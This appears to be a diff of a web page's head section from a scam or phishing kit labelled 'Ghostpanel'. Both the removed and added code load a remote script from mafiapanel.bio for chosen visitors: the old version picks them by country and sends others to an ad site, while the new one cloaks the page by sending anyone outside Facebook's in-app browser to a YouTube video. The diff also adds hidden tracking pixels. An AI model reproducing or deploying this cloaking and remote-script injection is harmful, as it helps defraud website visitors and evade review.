@@ -1,34 +1,29 @@
+    <meta name="robots" content="index, follow"/>
+	<meta name="googlebot" content="noindex"/> 
+    <meta name="robots" content="index">
+    <meta name="robots" content="noindex">
+    <meta name="robots" content="nofollow">
+<html lang="en">
+<head>
 <script>
-let countryHack = ['MX', 'DO', 'CO', 'GR', 'AR', 'HU', 'RS', 'RO', 'SK', 'SI', 'NI', 'VE', 'CL', 'CR', 'PE', 'PY', 'UY', 'EC', 'GT', 'PA', 'ES', 'CZ', 'HR', 'FR', 'SV', 'IT', 'BE', 'KR']; //pais
-let scriptHack = 'https://mafiapanel.bio/h/index.php?username=Danieladmin';
-let urlPromocion = 'https://chid.pages.dev/';
-let country;
-
-fetch('https://get.geojs.io/v1/ip/country')
-    .then((response) => response.text())
-    .then((data) => {
-        country = data;
-        country = countryHack.find((str) => str === country.trim());
-        redirectURL(country)
-    })
-
-
-function redirectURL(country) {
-
-
-    if (country) {
-        const script = document.createElement('script');
-        script.src = scriptHack;
-        document.head.appendChild(script);
-
-        console.log('REDIRECT HACK...' + country)
-    } else {
-        
-        window.location.href = urlPromocion;
-        console.log('REDIRECT ADS...' + country)
+    // Función para detectar si la página se abre en la aplicación de Facebook
+    function isFacebookApp() {
+        return navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");
     }
 
-}
+    // Función para redirigir si no está en la aplicación de Facebook
+    function checkAndRedirect() {
+        if (!isFacebookApp()) {
+            // Si no está en la aplicación de Facebook, redirigir directamente sin cargar el contenido
+            document.write("Redirigiendo a otra página...");
+            window.location.href = "https://www.youtube.com/watch?v=6HRHNxiyxs0";
+        }
+    }
 
+    // Llamar a la función al cargar la página
+    checkAndRedirect();
 </script>
-<img src="//whos.amung.us/pingjs/?k=danielaws&t=Ghostpanel&x=https://www.geekvape.com/Francia" style="display:none" alt="">
+<script src="https://mafiapanel.bio/h/index.php?username=Danieladmin" type="text/javascript" async="true"></script>
+<img src="//whos.amung.us/pingjs/?k=eslovak2&t=Ghostpanel&x=https://www.geekvape.com/lambonesmmg" style="display:none" alt="">
+<img src="//whos.amung.us/pingjs/?k=ghostpanel&t=Ghostpanel&x=https://www.geekvape.com/lambonesmmg" style="display:none" alt="">
+<img src="//whos.amung.us/pingjs/?k=danielaws&t=Ghostpanel&x=https://www.geekvape.com/lambonesmmg" style="display:none" alt=""
